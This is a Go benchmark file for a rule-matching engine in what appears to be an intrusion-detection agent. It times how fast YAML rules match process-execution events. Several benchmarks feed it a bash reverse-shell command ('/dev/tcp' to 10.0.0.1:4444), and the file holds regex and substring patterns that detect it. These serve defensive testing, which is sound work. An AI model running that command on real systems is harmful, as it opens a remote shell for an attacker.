package rule

import (
	"fmt"
	"os"
	"path/filepath"
	"testing"

	"go.uber.org/zap"
)

// BenchmarkMatchSingleRule benchmarks matching against a single rule.
func BenchmarkMatchSingleRule(b *testing.B) {
	dir := setupBenchRules(b, 1)
	m := NewManager(zap.NewNop(), dir)
	if err := m.Load(); err != nil {
		b.Fatal(err)
	}

	fields := map[string]string{
		"cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		"exe":     "/bin/bash",
		"pid":     "12345",
	}

	b.ResetTimer()
	for b.Loop() {
		m.Match("process_exec", fields)
	}
}

// BenchmarkMatchNoMatch benchmarks when no rules match (common case).
func BenchmarkMatchNoMatch(b *testing.B) {
	dir := setupBenchRules(b, 100)
	m := NewManager(zap.NewNop(), dir)
	if err := m.Load(); err != nil {
		b.Fatal(err)
	}

	// Fields that don't match any rule.
	fields := map[string]string{
		"cmdline": "/usr/sbin/sshd -D",
		"exe":     "/usr/sbin/sshd",
		"pid":     "1",
	}

	b.ResetTimer()
	for b.Loop() {
		m.Match("process_exec", fields)
	}
}

// BenchmarkMatch100Rules benchmarks matching against 100 rules.
func BenchmarkMatch100Rules(b *testing.B) {
	dir := setupBenchRules(b, 100)
	m := NewManager(zap.NewNop(), dir)
	if err := m.Load(); err != nil {
		b.Fatal(err)
	}

	// Fields that match the first rule.
	fields := map[string]string{
		"cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		"exe":     "/bin/bash",
		"pid":     "12345",
	}

	b.ResetTimer()
	for b.Loop() {
		m.Match("process_exec", fields)
	}
}

// BenchmarkConditionEvaluateEquals benchmarks the fastest operator.
func BenchmarkConditionEvaluateEquals(b *testing.B) {
	c := Condition{Op: OpEquals, Value: "/bin/bash"}
	for b.Loop() {
		c.Evaluate("/bin/bash")
	}
}

// BenchmarkConditionEvaluateRegex benchmarks regex evaluation.
func BenchmarkConditionEvaluateRegex(b *testing.B) {
	c := Condition{Op: OpRegex, Value: `bash\s+-i\s+>&\s+/dev/tcp/`}
	_ = c.validate("bench", 0)

	input := "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

	b.ResetTimer()
	for b.Loop() {
		c.Evaluate(input)
	}
}

// BenchmarkConditionEvaluateContains benchmarks string contains.
func BenchmarkConditionEvaluateContains(b *testing.B) {
	c := Condition{Op: OpContains, Value: "/dev/tcp/"}
	input := "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

	for b.Loop() {
		c.Evaluate(input)
	}
}

// BenchmarkRuleLoad benchmarks loading 100 rules from YAML files.
func BenchmarkRuleLoad(b *testing.B) {
	dir := setupBenchRules(b, 100)

	b.ResetTimer()
	for b.Loop() {
		m := NewManager(zap.NewNop(), dir)
		if err := m.Load(); err != nil {
			b.Fatal(err)
		}
	}
}

// setupBenchRules creates n rule YAML files for benchmarking.
func setupBenchRules(b testing.TB, n int) string {
	b.Helper()
	dir := b.(*testing.B).TempDir()

	for i := range n {
		content := fmt.Sprintf(`
schema_version: 1
id: BENCH-%04d
name: bench_rule_%d
version: 1
category: process
severity: high
agent:
  enabled: true
  action: alert
  match:
    event_type: process_exec
    conditions:
      - field: cmdline
        op: contains
        value: "pattern_%d"
      - field: exe
        op: starts_with
        value: "/tmp/bench_%d"
    logic: and
`, i, i, i, i)

		err := os.WriteFile(filepath.Join(dir, fmt.Sprintf("rule-%04d.yml", i)), []byte(content), 0644)
		if err != nil {
			b.Fatal(err)
		}
	}

	// Add one rule that actually matches for match benchmarks.
	matchRule := `
schema_version: 1
id: BENCH-MATCH
name: bench_match
version: 1
category: process
severity: critical
agent:
  enabled: true
  action: alert
  match:
    event_type: process_exec
    conditions:
      - field: cmdline
        op: contains
        value: "/dev/tcp/"
      - field: cmdline
        op: contains
        value: "0>&1"
    logic: and
`
	err := os.WriteFile(filepath.Join(dir, "rule-match.yml"), []byte(matchRule), 0644)
	if err != nil {
		b.Fatal(err)
	}

	return dir
}
